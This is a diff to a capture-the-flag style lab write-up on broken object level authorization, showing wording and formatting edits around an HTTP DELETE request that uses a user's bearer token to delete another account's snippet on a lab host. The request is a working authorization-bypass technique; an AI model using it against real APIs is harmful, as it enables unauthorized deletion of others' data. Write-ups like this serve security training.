@@ -8,7 +8,7 @@
 > **vulns:** broken object level authorization
 
 ## 0x00: intro
-- at first, We can login or register into the application, so, let's create our user
+- at first, we can login or register into the application, so, let's create our user
     ![register](image.png)
 - all actions on the application are controlled via api endpoints. when we register our user, the api returns a jwt and the role of this user, in this case, just `user`. we can try mass assignment, but will dont work.
     ![meeting the api](image-1.png)
@@ -47,10 +47,9 @@
     Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJnaHUiLCJpYXQiOjE3Njg0MDg5OTd9.vnfeokWaRBPNZU3jIYPJ5QsGMxQqsMcY0emBcbQkMhg
     ```
 - ok, and if i decided to pass, for example, the id `7`, i will delete the admin snippet?
-    ```
+    ```json
     DELETE /api/snippets/7 HTTP/2
     Host: lab-1768408858372-l4lvaq.labs-app.bugforge.io
-
     Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJnaHUiLCJpYXQiOjE3Njg0MDg5OTd9.vnfeokWaRBPNZU3jIYPJ5QsGMxQqsMcY0emBcbQkMhg
 
     HTTP/2 200 OK
